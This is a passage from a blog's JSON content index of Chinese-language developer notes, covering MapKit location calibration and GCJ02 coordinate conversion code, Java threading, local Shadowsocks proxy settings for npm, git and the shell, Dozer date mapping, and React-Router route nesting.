&#x3D; [[CLLocation alloc] initWithLatitude:tempUser.latitude longitude:tempUser.longitude]; &#x2F;&#x2F;计算两者绝对距离 CLLocationDistance distance &#x3D; [blueDot distanceFromLocation:user]; &#x2F;&#x2F;设置是否纠偏 if (distance &gt; 50 ) &#123; [[AppSettings instance] setNeedCalibrateCoordinate:![AppSettings instance].needCalibrateCoordinate]; &#125;&#125; 纠偏策略由于自动纠偏探测依赖于不稳定的ViewTree，所以很可能出现在卡顿的时候自动纠偏方法被连续调用两次（多出现于旧款iPad），所以需要制定一个可靠的纠偏策略，目前采用的策略： 在地图RegionChange时检查是否纠偏 在新的AnnotationView出现在MapView上时检测是否纠偏 通过拦截手势在用户操作时触发 存在问题 地图加载完毕后BlueDotView并不一定会出现在地图上，所以需要手动控制地图Zoom到某个Region保证BlueDotView出现 BlueDotView闪现，可能会导致多次调用 小技巧BlueDot的AnnotationView虽然不一定会出现在MapView上，但是不管MapView.showUser = ？多少，MapView的用户Annotation对象 MKUserLocation 永远会存在于地图上 如果想使用自己的Image来作为用户的AnnotationView，可以不再一开始就隐藏MapView.showUser，使用其作为参考点后再设置隐藏，因为BlueDotView实际被Add到MapView上时，并未进入Screen范围 用户的AnnotationView与BlueDotView时，实际是存在自己的AnnotationView的，可以采用赋值Image为nil的形式让其以透明样式存在","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"MKMapKit(一)：火星坐标坐标系转换","date":"2017-03-02T15:00:00.000Z","path":"2017/03/03/MKMapKit一火星坐标坐标系转换/","text":"火星坐标转换由于你懂的原因，国内有些GPS坐标需要转换，国内的GPS体系名称叫 GCJ02 而国际通用的叫 WGS84 下面是魔法代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154const static double a &#x3D; 6378245.0;const static double ee &#x3D; 0.00669342162296594323;const static double pi &#x3D; M_PI;static float calculateDegree(float degree, float minute, float second)&#123; return degree + (minute + (second &#x2F; 60.0)) &#x2F; 60.0;&#125;#define D(x,y,z) calculateDegree(x, y, z)+ (CLLocationCoordinate2D)gcj02FromWGS84:(CLLocationCoordinate2D)wgs &#123; CLLocationCoordinate2D gcj &#x3D; kCLLocationCoordinate2DInvalid; double wgLon &#x3D; wgs.longitude; double wgLat &#x3D; wgs.latitude; if (outOfChinaLand(wgs.latitude, wgs.longitude)) &#123; gcj.latitude &#x3D; wgs.latitude; gcj.longitude &#x3D; wgs.longitude; return gcj; &#125; double dLat &#x3D; transformLatitude(wgLon - 105.0, wgLat - 35.0); double dLon &#x3D; transformLongitude(wgLon - 105.0, wgLat - 35.0); double radLat &#x3D; wgLat &#x2F; 180.0 * pi; double magic &#x3D; sin(radLat); magic &#x3D; 1 - ee * magic * magic; double sqrtMagic &#x3D; sqrt(magic); dLat &#x3D; (dLat * 180.0) &#x2F; ((a * (1 - ee)) &#x2F; (magic * sqrtMagic) * pi); dLon &#x3D; (dLon * 180.0) &#x2F; (a &#x2F; sqrtMagic * cos(radLat) * pi); gcj.latitude &#x3D; wgLat + dLat; gcj.longitude &#x3D; wgLon + dLon; return gcj;&#125;+ (CLLocationCoordinate2D)wgs84FromGCJ02:(CLLocationCoordinate2D)gcj &#123; if (outOfChinaLand(gcj.latitude, gcj.longitude)) &#123; return gcj; &#125; CLLocationCoordinate2D latLng &#x3D; offsetDelta(gcj); double latitude &#x3D; gcj.latitude - latLng.latitude; double longitude &#x3D; gcj.longitude - latLng.longitude; return CLLocationCoordinate2DMake(latitude, longitude);&#125;static bool outOfChinaLand(double lat, double lon)&#123; CGRect taiwan &#x3D; CGRectMake(21.5, 120.2, 4, 2); bool isContain &#x3D; CGRectContainsPoint(taiwan, CGPointMake(lat, lon)); if (isContain) &#123; return true; &#125; CGPathRef path &#x3D; [self getChinaBoundingPath]; if (CGPathContainsPoint(path, NULL, CGPointMake(lat, lon), false)) &#123; return false; &#125; return true;&#125;static double transformLatitude(double x, double y)&#123; double ret &#x3D; -100.0 + 2.0 * x + 3.0 * y + 0.2 * y * y + 0.1 * x * y + 0.2 * sqrt(fabs(x)); ret +&#x3D; (20.0 * sin(6.0 * x * pi) + 20.0 * sin(2.0 * x * pi)) * 2.0 &#x2F; 3.0; ret +&#x3D; (20.0 * sin(y * pi) + 40.0 * sin(y &#x2F; 3.0 * pi)) * 2.0 &#x2F; 3.0; ret +&#x3D; (160.0 * sin(y &#x2F; 12.0 * pi) + 320 * sin(y * pi &#x2F; 30.0)) * 2.0 &#x2F; 3.0; return ret;&#125;static double transformLongitude(double x, double y)&#123; double ret &#x3D; 300.0 + x + 2.0 * y + 0.1 * x * x + 0.1 * x * y + 0.1 * sqrt(fabs(x)); ret +&#x3D; (20.0 * sin(6.0 * x * pi) + 20.0 * sin(2.0 * x * pi)) * 2.0 &#x2F; 3.0; ret +&#x3D; (20.0 * sin(x * pi) + 40.0 * sin(x &#x2F; 3.0 * pi)) * 2.0 &#x2F; 3.0; ret +&#x3D; (150.0 * sin(x &#x2F; 12.0 * pi) + 300.0 * sin(x &#x2F; 30.0 * pi)) * 2.0 &#x2F; 3.0; return ret;&#125;+(CGPathRef) getChinaBoundingPath&#123; static CGMutablePathRef pathRef &#x3D; NULL; if (pathRef &#x3D;&#x3D; NULL) &#123; pathRef &#x3D; CGPathCreateMutable(); CGPathMoveToPoint(pathRef, NULL, D(48,58,42.64), D(87, 5, 59.19)); CGPathAddLineToPoint(pathRef, NULL, D(46, 43, 33.27), D(85, 25, 26.56)); CGPathAddLineToPoint(pathRef, NULL, D(47, 00, 18.85), D(83, 13, 32.25)); CGPathAddLineToPoint(pathRef, NULL, D(44, 51, 45.02), D(79, 52, 21.83)); CGPathAddLineToPoint(pathRef, NULL, D(42, 06, 38.75), D(80, 16, 38.32)); CGPathAddLineToPoint(pathRef, NULL, D(40, 26, 33.02), D(74, 52, 43.66)); CGPathAddLineToPoint(pathRef, NULL, D(38, 46, 42.06), D(73, 45, 47.54)); CGPathAddLineToPoint(pathRef, NULL, D(35, 40, 53.53), D(77, 17, 50.18)); CGPathAddLineToPoint(pathRef, NULL, D(35, 18, 19.61), D(80, 25, 3.57)); CGPathAddLineToPoint(pathRef, NULL, D(33, 47, 49.88), D(79, 4, 29.33)); CGPathAddLineToPoint(pathRef, NULL, D(31, 30, 12.49), D(78, 27, 15.10)); CGPathAddLineToPoint(pathRef, NULL, D(29, 56, 32.62), D(81, 15, 44.46)); CGPathAddLineToPoint(pathRef, NULL, D(27, 11, 56.65), D(89, 01, 43.60)); CGPathAddLineToPoint(pathRef, NULL, D(28, 12, 41.71), D(97, 27, 43.41)); CGPathAddLineToPoint(pathRef, NULL, D(25, 53, 39.08), D(98, 48, 8.70)); CGPathAddLineToPoint(pathRef, NULL, D(24, 39, 34.05), D(97, 28, 21.20)); CGPathAddLineToPoint(pathRef, NULL, D(23, 45, 59.97), D(97, 39, 54.56)); CGPathAddLineToPoint(pathRef, NULL, D(21, 06, 32.01), D(101, 21, 31.23)); CGPathAddLineToPoint(pathRef, NULL, D(22, 39, 01.59), D(103, 26, 4.0)); CGPathAddLineToPoint(pathRef, NULL, D(20, 16, 53.73), D(107, 49, 47.06)); CGPathAddLineToPoint(pathRef, NULL, D(15, 47, 06.87), D(108, 54, 19.46)); CGPathAddLineToPoint(pathRef, NULL, D(14, 53, 53.70), D(114, 38, 35.08)); CGPathAddLineToPoint(pathRef, NULL, D(21, 04, 46.90), D(121, 47, 25.12)); CGPathAddLineToPoint(pathRef, NULL, D(30, 04, 39.55), D(125, 46, 41.78)); CGPathAddLineToPoint(pathRef, NULL, D(39, 29, 30.38), D(123, 11, 52.45)); CGPathAddLineToPoint(pathRef, NULL, D(42, 46, 30.75), D(131, 10, 38.60)); CGPathAddLineToPoint(pathRef, NULL, D(48, 15, 27.43), D(134, 46, 49.54)); CGPathAddLineToPoint(pathRef, NULL, D(49, 29, 41.88), D(127, 50, 21.50)); CGPathAddLineToPoint(pathRef, NULL, D(53, 06, 13.32), D(125, 9, 54.19)); CGPathAddLineToPoint(pathRef, NULL, D(52, 52, 56.58), D(119, 52, 42.41)); CGPathAddLineToPoint(pathRef, NULL, D(48, 05, 29.20), D(115, 17, 35.36)); CGPathAddLineToPoint(pathRef, NULL, D(46, 32, 0.41), D(119, 44, 29.70)); CGPathAddLineToPoint(pathRef, NULL, D(44, 36, 38.94), D(111, 41, 41.13)); CGPathAddLineToPoint(pathRef, NULL, D(42, 13, 8.78), D(107, 12, 24.35)); CGPathAddLineToPoint(pathRef, NULL, D(42, 43, 53.70), D(96, 26, 11.34)); CGPathAddLineToPoint(pathRef, NULL, D(44, 44, 42.52), D(93, 47, 30.02)); CGPathAddLineToPoint(pathRef, NULL, D(45, 18, 42.86), D(90, 47, 27.32)); CGPathAddLineToPoint(pathRef, NULL, D(47, 45, 6.43), D(90, 10, 4.97)); CGPathCloseSubpath(pathRef); &#125; return pathRef;&#125;static CLLocationCoordinate2D offsetDelta(CLLocationCoordinate2D source)&#123; double dLat; double dLng; double a &#x3D; 6378245.0; double ee &#x3D; 0.00669342162296594323; dLat &#x3D; transformLatitude(source.longitude-105.0, source.latitude-35.0); dLng &#x3D; transformLongitude(source.longitude-105.0, source.latitude-35.0); double radLat &#x3D; source.latitude &#x2F; 180.0 * M_PI; double magic &#x3D; sin(radLat); magic &#x3D; 1 - ee*magic*magic; double sqrtMagic &#x3D; sqrt(magic); dLat &#x3D; (dLat * 180.0) &#x2F; ((a * (1 - ee)) &#x2F; (magic * sqrtMagic) * M_PI); dLng &#x3D; (dLng * 180.0) &#x2F; (a &#x2F; sqrtMagic * cos(radLat) * M_PI); return CLLocationCoordinate2DMake(dLat, dLng);&#125;#undef D(x,y,z)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"Java多线程预习小笔记","date":"2016-12-31T15:00:00.000Z","path":"2017/01/01/Java多线程预习小笔记/","text":"多线程多线程的基本知识我是参考了以下文章 Java多线程的基本概念: 讲了一些基本概念 林炳文Evankaka的多线程解析: 讲了一些多线程的经典例题和一些博主自己的总结，写的十分不错 Synchronized及其实现原理: 简述了多线程中关键字Synchronized的实现原理 CountDownLatch与CyclicBarrier: 多线程编程中一些控制方法 本文在以上文章的基础上，说说我自己的理解(思维回路可能比较奇怪)，对一些没有提到的细节进行补充 多线程的实现方式多线程有几种实现方式，这是好多面试题里问的，一般来说网上的答案是这样三个或者文章Java实现多线程的四个方式这样的 1234567&#x2F;&#x2F;一般是这三个1、继承Thread类创建线程2、实现Runnable接口创建线程3、实现Callable接口通过FutureTask包装器来创建Thread线程&#x2F;&#x2F;这个作者理解错了4、使用ExecutorService、Callable、Future实现有返回结果的线程(这个是错的，参考下文) 这些方式有时候是三个，有时候是四个，他们有什么区别呢？先说结论: 多线程只有一个实现方式，就是实现Runnable接口， 并且使用Thread进行开启 继承Thread类正确的理解方式 Thread类本身就是一个实现了Runnable接口的类，继承它相当于实现了Runnable 好处是在于不用使用Thread去包装Runnable了 12345678910public class MyThread extends Thread &#123; public void run() &#123; System.out.println(&quot;MyThread.run()&quot;); &#125; &#125; MyThread myThread1 &#x3D; new MyThread(); &lt;&#x3D;&#x3D;这里可以直接new，不用包装MyThread myThread2 &#x3D; new MyThread(); myThread1.start(); myThread2.start(); 实现Runnable接口需要使用Thread进行包装才能开启线程 12345678class RunnableDemo implements Runnable &#123; public void run() &#123; System.out.println(&quot;MyThread.run()&quot;); &#125; &#125;Thread thread &#x3D; new Thread(new RunnableDemo(), &quot;threadName&quot;); &lt;&#x3D;&#x3D;需要使用Thread包装thread.start (); Callable 和 FutureTask正确的理解方式是 FutureTask本身实现了RunnableFuture，RunnableFuture继承于Runnable和Future，FutureTask可以通过Callable进行实例化，实例化的对象相当于实现了Runnable 得到了FutureTask还需要通过Thread包装才能开启线程 12345678910111213&#x2F;&#x2F;1. 新建一个实现了Callable的类public class CallableObj implements Callable&lt;String&gt; &#123; public String call() throws Exception &#123; return null; &#125;&#125;&#x2F;&#x2F;2. 使用FutureTask包装CallableFutureTask future &#x3D; new FutureTask(new CallableObj());&#x2F;&#x2F;3. 使用Thread包装FutureTaskThread thread &#x3D; new Thread(future);thread.start() 多线程解析先来看单词 单词 意思 意义 Thread 线程 所谓多线程，就是指的多个Thread Runnable 可以跑，即可以执行 每个Thread都需要一个可以执行的东西 Callable 可以调用 可以调用的意思，是可以回调，相当于JS里的callback，iOS里的block Future 未来 异步任务，配合回调函数，相当于JS里的Promise 从上表分析 Thread和Runnable是互相对应共同存在的，这两个才是线程操作的概念 而Future和Callable是另一个概念集合，属于异步和回调 他们四个都属于Concurrent的Package，也就是说都属于并发(Concurrent)包 Thread和Runnable代表线程操作每个Thread中有一个Runnable成员target 如果是继承的Thread的类，在new的时候会把target指向this 如果是通过Runnable的Object实例化的Thread，target会指向这个Object 当调用了Thread的start方法之后，Thread会进入可执行状态(Runnable)，然后在被CPU执行时，Thread调用自己的run方法，方法内执行Target的run方法 Future和Callable代表异步和回调Future英文直译是未来的意思，也就是不是当下发生的事情，而Callable代表可以调用 Future本身是一个对异步的控制Interface，包括取消，挂起和执行 Callable是只有一个call方法，返回一个V范型的返回值 FutureTask是一个Class，实现了Runnable，Future的Interface，可以通过Callable进行实例化 综上所属，所谓的第三种可以通过Callable实现多线程，就是扯淡。。。 只不过FutureTask刚好就是一个实现了Runnable的Object，所以可以用来实例化Thread，而FutureTask的实例化恰好需要Callable而已 ExecutorService是什么(为什么上文第四个多线程方法是扯淡)ExecutorService是一个Interface，继承于Executor，其可以通过静态方法获取到实例，好像俗称 线程池 呃 我不确定 1ExecutorService executorService &#x3D; Executors.newCachedThreadPool(); 其本质是一个通过Future、Callable、Runnable来规划并发任务的容器，Future负责任务管理，Runnable负责任务逻辑代码，Callable负责返回值 Executor这个Interface只有一个方法，就是execute(Runnable command)，执行某个可以Runnable的命令，而ExecutorService则在继承其基础上，提供了3个主要方法 12345678&#x2F;&#x2F;提交一个Callable的对象，并且通过Future拿到返回值&lt;T&gt; Future&lt;T&gt; submit(Callable&lt;T&gt; task);&#x2F;&#x2F;提交一个Runnable的对象，并且通过Future拿到返回值，返回值为T&lt;T&gt; Future&lt;T&gt; submit(Runnable task, T result);&#x2F;&#x2F;提一个Runnable的对象，并且通过Future拿到返回值nullFuture&lt;?&gt; submit(Runnable task); 根据上文陈述， Runnable接口只是负责线程Thread中的Target执行什么 所以不具有返回值，如果想要得到ExecutorService执行的返回值，必须使用Callable接口，并且使用Future.get()获得，所以以上3个submit分别做了以下操作 方法 取得返回值原理 submit(Callable task) 提交的就是一个Callable对象，所以可以得到返回值 submit(Runnable task, T result) 提交的Runnable对象不具有返回值，在ExecutorService，内部使用一个FutureTask对象，用T result来实例化FutureTask的Callable对象，从而得到期望的T范型返回值 submit(Runnable task) Runnable没有返回值，那就不要返回值了，执行完直接返回null 可以看出，之所以submit(Runnable task, T result)可以获得返回值，是因为在ExecutorService内部使用了FutureTask对象，这个对象内部有callable对象来确定返回值。这也说明来Java实现多线程的四个方式文章中的所谓第四个方式是没看源码 多线程控制使用Object锁在文章林炳文Evankaka的多线程解析中讲到了一个经典的例题 建立三个线程，A线程打印10次A，B线程打印10次B,C线程打印10次C，要求线程同时运行，交替打印10次ABC。 使用到了Object的wait()和notify()，这里进行补充解析来阐明什么叫Object锁，基本原理请参考林炳文的文章 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&#x2F;** * wait用法 * @author DreamSea * @time 2015.3.9 *&#x2F;package com.multithread.wait;public class MyThreadPrinter2 implements Runnable &#123; private String name; private Object prev; private Object self; private MyThreadPrinter2(String name, Object prev, Object self) &#123; this.name &#x3D; name; this.prev &#x3D; prev; this.self &#x3D; self; &#125; @Override public void run() &#123; int count &#x3D; 10; while (count &gt; 0) &#123; synchronized (prev) &#123; synchronized (self) &#123; System.out.print(name); count--; self.notify(); &#125; try &#123; prev.wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; public static void main(String[] args) throws Exception &#123; Object a &#x3D; new Object(); Object b &#x3D; new Object(); Object c &#x3D; new Object(); MyThreadPrinter2 pa &#x3D; new MyThreadPrinter2(&quot;A&quot;, c, a); MyThreadPrinter2 pb &#x3D; new MyThreadPrinter2(&quot;B&quot;, a, b); MyThreadPrinter2 pc &#x3D; new MyThreadPrinter2(&quot;C&quot;, b, c); new Thread(pa).start(); Thread.sleep(100); &#x2F;&#x2F;确保按顺序A、B、C执行 new Thread(pb).start(); Thread.sleep(100); new Thread(pc).start(); Thread.sleep(100); &#125; &#125; 在程序中有一行注释 1Thread.sleep(100); &#x2F;&#x2F;确保按顺序A、B、C执行 十分重要，如果不使用Thread.sleep的话，会输出结果ACB循环而不是ABC，为什么是这样的呢？ 1ACBACBACBACBACBACBACBACBACBACB Object锁顺序分析我们在分析图标中用不同的符号代表状态 x 代表 当前获得了Object锁还未执行打印 ~x 代表 即将执行却由于获取不到Object锁被挂起 !x 代表 完成了打印结果 并且释放Object锁 ?x 代表 执行了wait() 并且释放Object锁 不加sleep(100)的情况 对象 1 2 3 4 5 6 7 8 A c a c !a ?c !a c ~a c ~a c ~a c a c a B ~a a ~b a ~b a ~b a b a !b ?a !b ~a C b ~c b ~c b c b !c ?b !c b ~c b ~c b ~c 输出 null A A AC AC ACB ACB 循环 加了sleep(100)的情况 对象 1 2 3 4 5 6 7 8 A c a c !a ?c !a ?c !a ?c !a ?c !a c !a c a B sleep sleep a b a !b ?a !b ?a !b ?a !b ?a C sleep sleep sleep sleep b ~c b !c ?b !c ?b 输出 null A A AB AB ABC ACB 循环 在第8步进入 B对象Thread执行了a.wait，而C对象线程执行了b.wait 之后等同于第一步的两者都在sleep，经过以上分析，我们可以得知sleep就是通过这种方式保证了ABC的顺序 如果将sleep改为1000毫秒，可以清楚的看到，第一组ABC打印使用了3秒以便进入步骤8，剩余的则是瞬时完成的 使用控制器除了使用Object锁自己进行线程控制之外，Concurrent包内部也提供了一些控制器，比如文章CountDownLatch与CyclicBarrier中提到的 CountDownLatch: 计数(Count)减少(Down)门挡(Latch)，Latch这个单词是门闩的意思，就是关门的那个横木，从字面意思可以理解出来，这就是个计数器，一旦计数减少到某一阈值，就触发 CyclicBarrier: 循环(Cyclic)遮挡(Barrier),Barrier这个是火车道那种一堆人一起的遮挡，意思就是必须所有人等待一起过，和Latch这个横木不一样，是周期性的遮挡的放开，所以叫Cyclic，这个周期就是你设定的第一个参数 结语这个文章很早就写好了，一直没有发表，当时为了Java而写的，后来在iOS里也发现了相似的机制，同样具有 synchronized 关键词和上文的两个控制器，但是iOS为了追求效率，大部分称需要喜欢自己手动控制锁。。。所以就很容易死锁。。。后台不一样，后台保证稳定性是第一的，所以更注重synchronized的理解","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Thread","slug":"Thread","permalink":"http://yoursite.com/tags/Thread/"}]},{"title":"终端下为npm和git配置Shadowsocks","date":"2016-12-17T20:00:00.000Z","path":"2016/12/18/终端下为npm和git配置Shadowsocks/","text":"终端下的代理通过文章MacOS 10.12 终端命令行下使用Shadowsocks我们得知Shadowsocks-NG可以提供HTTP和HTTPS代理了,那么我们可以单独为某些命令配置代理 为npm配置代理参考文章npm的配置文件npmrc，我们可以在Mac下新建一个配置文件 1vim ~&#x2F;.npmrc 在文件内写入 12proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087https-proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087 然后保存退出即可，如果想使用命令直接配置，参考文章命令配置npmrc,其中也对配置文件进行更详细的解释 npm获取配置有6种方式，优先级由高到底 命令行参数。 –proxy http://server:port即将proxy的值设为http://server:port。 环境变量。 以npm_config_为前缀的环境变量将会被认为是npm的配置属性。如设置proxy可以加入这样的环境变量npm_config_proxy=http://server:port。 用户配置文件。可以通过npm config get userconfig查看文件路径。如果是mac系统的话默认路径就是$HOME/.npmrc。 全局配置文件。可以通过npm config get globalconfig查看文件路径。mac系统的默认路径是/usr/local/etc/npmrc。 内置配置文件。安装npm的目录下的npmrc文件。 默认配置。 npm本身有默认配置参数，如果以上5条都没设置，则npm会使用默认配置参数。 为Git配置代理首先Git分为3种协议模式 协议 是否可以使用HTTP代理 git:// 不能直接使用 http:// 可以 https:// 可以 命令行配置12345678&#x2F;&#x2F;配置git config --global core.gitproxy proxygit config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087&#x2F;&#x2F;取消git config --global --unset core.gitproxygit config --global --unset http.proxygit config --global --unset https.proxy 修改配置文件git的配置文件位于 1vim ~&#x2F;.gitconfig 如果我们进行了代理配置，可以看到 123456[core] gitproxy &#x3D; proxy[http] proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087[https] proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087","tags":[{"name":"Terminal","slug":"Terminal","permalink":"http://yoursite.com/tags/Terminal/"},{"name":"FireWall","slug":"FireWall","permalink":"http://yoursite.com/tags/FireWall/"}]},{"title":"MacOS 10.12 终端命令行下使用Shadowsocks","date":"2016-12-17T15:00:00.000Z","path":"2016/12/18/终端命令行下使用Shadowsocks/","text":"无穷无尽的战斗方校长今年还说想为祖国再尽一份余力，真是可喜可贺啊 Shadowsocks-NG有一个新的Shadowsocks的客户端叫 Shadowsocks-NG 解决了一个长久以来的痛点，Shadowsocks没有HTTP代理，导致我们需要使用polipo等软件进行协议转换 现在其在1087端口提供了http代理服务，我们可以通过在命令行直接设置代理，来使用SS服务了 123456&#x2F;&#x2F;开启代理export http_proxy&#x3D;127.0.0.1:1087export https_proxy&#x3D;127.0.0.1:1087&#x2F;&#x2F;关闭代理unset http_proxyunset https_proxy 配置一个别名方便启动1vim ~&#x2F;.bash_profile 在文件内加入 123# Custom Add not Systemalias proxy-on&#x3D;&#39;export http_proxy&#x3D;127.0.0.1:1087;export https_proxy&#x3D;$http_proxy&#39;alias proxy-off&#x3D;&#39;unset http_proxy;unset https_proxy&#39; 就可以在命令行内通过 proxy-on 和 proxy-off 来开启关闭代理 sudo操作怎么办以上快捷启动配置只能在User的命令行里进行使用，如果想对sudo操作挂proxy，需要先使用命令 1sudo -s 进入bash 3.2# 然后手动设置","tags":[{"name":"Terminal","slug":"Terminal","permalink":"http://yoursite.com/tags/Terminal/"},{"name":"FireWall","slug":"FireWall","permalink":"http://yoursite.com/tags/FireWall/"}]},{"title":"Dozer进行模型转换时格式化","date":"2016-12-14T15:00:00.000Z","path":"2016/12/15/Dozer进行模型转换时格式化/","text":"模型转换时格式化Dozer除了默认的模型转化，还可以通过配置map方法或者XML配置文件来进行自定义转化 例如我们要将Date类型转化为格式化后的结果 1234567891011121314&#x2F;&#x2F;进行转化时配置BeanMappingBuilder configure &#x3D; new BeanMappingBuilder() &#123; @Override protected void configure() &#123; mapping(SourceObj.class, TargetObj.class, TypeMappingOptions.dateFormat(&quot;yyyy-MM-dd&quot;)); &#125;&#125;;&#x2F;&#x2F;创建DozerDozerBeanMapper dozer &#x3D; new DozerBeanMapper();&#x2F;&#x2F;添加配置dozer.addMapping(configure);&#x2F;&#x2F;进行转化dozer.map(source, target); 如果在source和target中有两个日期时间，一个叫 firstDate 一个叫 secondDate 想使用不同的格式化 1234567@Overrideprotected void configure() &#123; &#x2F;&#x2F;为first配置横杠格式化 mapping(SourceObj.class, TargetObj.class, TypeMappingOptions.dateFormat(&quot;yyyy-MM-dd&quot;)).fields(&quot;firstDate&quot;,&quot;firstDate&quot;); &#x2F;&#x2F;为second配置斜杠格式化 mapping(SourceObj.class, TargetObj.class, TypeMappingOptions.dateFormat(&quot;yyyy&#x2F;MM&#x2F;dd&quot;)).fields(&quot;secondDate&quot;,&quot;secondDate&quot;);&#125; 与Spring注解配合使用在HTTP中接受字符串日期想自动转化成Date类型，可以采用Spring的注解 DateTimeFormat 参考文章 在Java层返回给HTTP的Object时想把Date类型再转化成字符串类型，可以通过 重写GetSet方法，但是可能会无法使用Dozer工具 配置Dozer的BeanMappingBuilder","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Dozer","slug":"Dozer","permalink":"http://yoursite.com/tags/Dozer/"}]},{"title":"React-Router的基本概念和小提示","date":"2016-12-09T23:00:00.000Z","path":"2016/12/10/ReactRouter的基本概念和小提示/","text":"React-Router和传统的网页不太一样，手机上以H5为代表的Mobile Web应用更加倾向于SPA(Single Page Application)，也就是说我在一个URL页面下可以通过JS动态切换HTML文本内容来达到页面切换的效果 但是前端程序员的思维还是离不开URL地址的概念，React-Router就是为了解决这一个问题，其使用URL来标记不同的页面内容，使用URL作为内容的标记位 但是实际浏览器的Location 并没有跳转。 详细教程可以参考阮一峰先生的Blog React-Router的误解虽然React结合WePack很适合来做SPA，但是React本身并不是强制要求SPA的，React只是一个网页模块化的工具 Router和RouteReact-Router本身有两个Component，一个叫 Router 一个叫 Route 注意最后的小字母r，其中Router是Route的父组件。 Router: 路由器 Route: 路由节点 1234&lt;Router history&#x3D;&#123;hashHistory&#125;&gt; &lt;&#x3D;&#x3D;注意这个带r &lt;Route path&#x3D;&quot;&#x2F;&quot; component&#x3D;&#123;App&#125;&#x2F;&gt; &lt;&#x3D;&#x3D;这个不带r &lt;Route path&#x3D;&quot;&#x2F;about&quot; component&#x3D;&#123;About&#125;&#x2F;&gt;&lt;&#x2F;Router&gt; history除了要注意Router和Route的区别之外，还要注意Router有个props叫做 history history 作用 hashHistory 标准的单页面，根据URL中#号后的字符串决定内容 browserHistory 使用浏览器的URL，需要对服务端改造不然会404 createMemoryHistory 在服务器渲染的时候内存里的一个变量 其中hashHistory中根据sharp号进行解析，就更利于SPA的理解了，因为在通常情况下 href=# 代表浏览器文档的顶部，是文档内部的定位符号。所以说hashHistory的意思就是分析#定位符号后边的字符串，在不切换document的情况下切换内容。 导入Route作为Router的Props我们可以单独写一个文件来管理Route 12345678910111213&#x2F;&#x2F;router.jsximport React from &quot;react&quot;; &#x2F;&#x2F; 引入reactimport &#123;Route&#125; from &quot;react-router&quot;; &#x2F;&#x2F; 引入react路由import &#123;App, AllBugs, MyBugs&#125; from &quot;.&#x2F;containers&quot;; &#x2F;&#x2F; 引入各容器组件export default ( &lt;Route path&#x3D;&quot;&#x2F;&quot; component&#x3D;&#123;App&#125;&gt; &lt;Route path&#x3D;&quot;bug&quot; component&#x3D;&#123;AllBugs&#125;&gt; &lt;Route path&#x3D;&quot;my&quot; component&#x3D;&#123;MyBugs&#125;&#x2F;&gt; &lt;&#x2F;Route&gt; &lt;&#x2F;Route&gt;) 然后进行导入 123import routes from &quot;.&#x2F;router&quot;;&lt;Router history&#x3D;&#123;hashHistory&#125; routes&#x3D;&#123;routes&#125;&#x2F;&gt; Route的嵌套在节点的安排中Route是可以嵌套的，但是不用手动添加嵌套的分割斜杠“／” 阮一峰先生给出的示例不知道为什么在我这里会报错，未找到原因 例如访问设置URL /bug/my 12345678910111213&#x2F;&#x2F;阮一峰老师示例&lt;Route path&#x3D;&quot;&#x2F;&quot; component&#x3D;&#123;App&#125;&gt; &lt;Route path&#x3D;&quot;&#x2F;bug&quot; component&#x3D;&#123;AllBugs&#125;&gt; &lt;Route path&#x3D;&quot;&#x2F;my&quot; component&#x3D;&#123;MyBugs&#125;&#x2F;&gt; &lt;&#x3D;&#x3D;错误，无法正常展示 &lt;&#x2F;Route&gt;&lt;&#x2F;Route&gt;&#x2F;&#x2F;解决办法&lt;Route path&#x3D;&quot;&#x2F;&quot; component&#x3D;&#123;App&#125;&gt; &lt;Route path&#x3D;&quot;bug&quot; component&#x3D;&#123;AllBugs&#125;&gt; &lt;Route path&#x3D;&quot;my&quot; component&#x3D;&#123;MyBugs&#125;&#x2F;&gt; &lt;&#x3D;&#x3D;正确 &lt;&#x2F;Route&gt;&lt;&#x2F;Route&gt; 而且不能在一行内写入多级目录 123456789101112&#x2F;&#x2F;多级目录&lt;Route path&#x3D;&quot;&#x2F;&quot; component&#x3D;&#123;App&#125;&gt; &lt;Route path&#x3D;&quot;bug&quot; component&#x3D;&#123;AllBugs&#125; &#x2F;&gt; &lt;Route path&#x3D;&quot;bug&#x2F;my&quot; component&#x3D;&#123;MyBugs&#125; &#x2F;&gt; &lt;&#x3D;&#x3D;错误，无法正常展示&lt;&#x2F;Route&gt;&#x2F;&#x2F;解决办法&lt;Route path&#x3D;&quot;&#x2F;&quot; component&#x3D;&#123;App&#125;&gt; &lt;Route path&#x3D;&quot;bug&quot; component&#x3D;&#123;AllBugs&#125;&gt; &lt;Route path&#x3D;&quot;my&quot; component&#x3D;&#123;MyBugs&#125;&#x2F;&gt; &lt;&#x3D;&#x3D;正确，每级只写一个 &lt;&#x2F;Route&gt;&lt;&#x2F;Route&gt;","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"mapDispatchToProps简洁Object写法分析","date":"2016-12-05T23:00:00.000Z","path":"2016/12/06/mapDispatchToProps简洁Object写法分析/","text":"React-Redux正常的写法分析在Connect函数中有两个主要的参数就是 mapStateToProps mapDispatchToProps 其中前者很好理解，是返回一个Object 例如 12345678const mapStateToProps &#x3D; (state, ownProps) &#x3D;&gt; &#123; let obj &#x3D; &#123; count: state.count + ownProps.count &#125; 